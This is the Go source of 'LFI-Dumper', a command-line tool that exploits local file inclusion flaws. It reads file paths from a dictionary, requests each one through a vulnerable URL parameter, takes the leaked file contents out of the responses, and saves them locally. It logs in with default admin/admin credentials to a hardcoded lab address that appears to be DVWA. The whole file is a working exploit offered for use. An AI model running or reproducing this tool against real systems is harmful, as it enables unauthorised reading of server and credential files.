package main

import (
	"bufio"
	"bytes"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"net/http"
	"net/http/cookiejar"
	"os"
	"path"
	"strings"
	"time"

	"github.com/vardius/progress-go"
)

// Variables
var client http.Client

func init() {
	jar, err := cookiejar.New(nil)
	if err != nil {
		log.Fatalf("Got error while creating cookie jar %s", err.Error())
	}
	client = http.Client{
		Jar:     jar,
		Timeout: 5 * time.Second,
	}
}

func clean_dictionary_entry(entry string) string {
	s := strings.Trim(entry, "\r")
	s = strings.Trim(s, "\n")
	return s
}

func print_AsciiArt() {
	fmt.Println()
	fmt.Println(" ▄▄▌  ·▄▄▄▪    ·▄▄▄▄  ▄• ▄▌• ▌ ▄ ·.  ▄▄▄·▄▄▄ .▄▄▄")
	fmt.Println(" ██•  ▐▄▄ ██   ██· ██ █▪██▌·██ ▐███▪▐█ ▄█▀▄.▀·▀▄ █·")
	fmt.Println(" ██ ▪ █  ▪▐█·  ▐█▪ ▐█▌█▌▐█▌▐█ ▌▐▌▐█· ██▀·▐▀▀▪▄▐▀▀▄ ")
	fmt.Println(" ▐█▌ ▄██ .▐█▌  ██. ██ ▐█▄█▌██ ██▌▐█▌▐█▪·•▐█▄▄▌▐█•█▌")
	fmt.Println(" .▀▀▀ ▀▀▀ ▀▀▀  ▀▀▀▀▀•  ▀▀▀ ▀▀  █▪▀▀▀.▀    ▀▀▀ .▀  ▀")
	fmt.Println()
	fmt.Println("     https://github.com/Asiern/LFI-Dumper")
	fmt.Println()

}

func getFile(endpoint string, file string, outputpath string) {

	// Generate url by joining endpoint & file
	url := endpoint + file
	// fmt.Println(url)

	// Create http Request
	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		log.Fatalf(err.Error())
	}
	// for _, c := range req.Cookies() {
	// 	fmt.Println(c)
	// }

	// Send request
	response, err := client.Do(req)
	if err != nil {
		log.Fatalf("Error occured. Error is: %s", err.Error())
	}
	defer response.Body.Close()

	// Get local file contents from response body
	body, err := ioutil.ReadAll(response.Body)
	if err != nil {
		fmt.Println(err)
		return
	}

	// Get Local file from request body
	content := string(body)
	pos := strings.Index(content, "<!DOCTYPE")
	if pos == -1 {
		return
	}
	content = content[:pos]
	if len(content) < 5 {
		return
	}

	// Create output dir
	_, err = os.Stat(outputpath)
	if os.IsNotExist(err) {
		err = os.MkdirAll(outputpath, os.ModeDir)
		if err != nil {
			fmt.Println(err)
			return
		}
	}

	// Save contents to file
	outputfilepath := path.Join(outputpath, path.Base(file))
	outputfile, err := os.Create(outputfilepath)
	if err != nil {
		fmt.Println(err)
		os.Exit(-1)
	}
	outputfile.WriteString(content)
	outputfile.Close()

}

func getLineCount(path string) int {
	file, err := os.Open(path)
	if err != nil {
		fmt.Println(err)
		os.Exit(-1)
	}
	reader := bufio.NewReader(file)
	nlines := 0
	for {
		line, err := reader.ReadString('\n') // Read until end of line
		if line == "" || (err != nil && err != io.EOF) {
			break
		}
		nlines++
	}
	return nlines
}

func main() {

	var endpoint, outdir, dictionaryPath, username, password string
	// Parse arguments
	for i, arg := range os.Args[1:] {
		if string(arg[0]) == "-" {
			switch arg[1:] {
			case "e": // Get target url
				endpoint = os.Args[i+2]
			case "o": // Output directory
				outdir = os.Args[i+2]
			case "d": // Dictionary
				dictionaryPath = os.Args[i+2]
			case "u": // Username
				username = os.Args[i+2]
			case "p": // Password
				password = os.Args[i+2]
			case "h": // Help menu
				print_AsciiArt()
				fmt.Println()
				fmt.Println("Usage: ./lfidumper -e 'http://target.com/page=' -d dictionary.txt")
				fmt.Println()
				fmt.Println("Options:")
				fmt.Println("\t -e : Endpoint url. -e 'http://target.com/page='")
				fmt.Println("\t -o : Output directory. -o output.\n\t      If not specified the output directory will be './out'.")
				fmt.Println("\t -u : Username")
				fmt.Println("\t -p : Password")
				fmt.Println("\t -d : Dictionary")
				fmt.Println("\t -h : Show this menu")
				fmt.Println()
				os.Exit(1)
			default:
				fmt.Println("Illegal command arguments.\nSee './lfidumper -h' for more information.")
				os.Exit(-1)
			}
		}
	}
	print_AsciiArt()

	if endpoint == "" {
		fmt.Println("No target url specified. Specify target './lfidumper -e http://target/page='")
		os.Exit(-1)
	}
	if dictionaryPath == "" {
		fmt.Println("No dictionary specified. './lfidumper -d dictionary.txt'")
		os.Exit(-1)
	}
	if username == "" || password == "" {
		fmt.Println("No credentials specified. Using default credentials")
		username = "admin"
		password = "admin"
	}
	if outdir == "" {
		outdir = "out"
		fmt.Println("No output directory specified. Using './" + outdir + "' as the output directory\n")
	}

	// Open dictionary
	dictionary, err := os.Open(dictionaryPath)
	if err != nil {
		print(err)
		os.Exit(1)
	}
	defer dictionary.Close()

	payload := "username=" + username + "&password=" + password + "&Login=Login"
	client.Post("http://192.168.1.131/dvwa/login.php", "application/x-www-form-urlencoded", bytes.NewBufferString(payload))

	// Read dictionary lines
	bar := progress.New(0, int64(getLineCount(dictionaryPath)))
	_, _ = bar.Start()
	reader := bufio.NewReader(dictionary)

	defer func() {
		if _, err := bar.Stop(); err != nil {
			log.Printf("failed to finish progress: %v", err)
		}
	}()
	var line string
	for {
		line, err = reader.ReadString('\n') // Read until end of line
		if line == "" || (err != nil && err != io.EOF) {
			break
		}
		line = clean_dictionary_entry(line[:len(line)-1])

		// Get file contents
		getFile(endpoint, line, outdir)
		bar.Advance(1)
	}
}
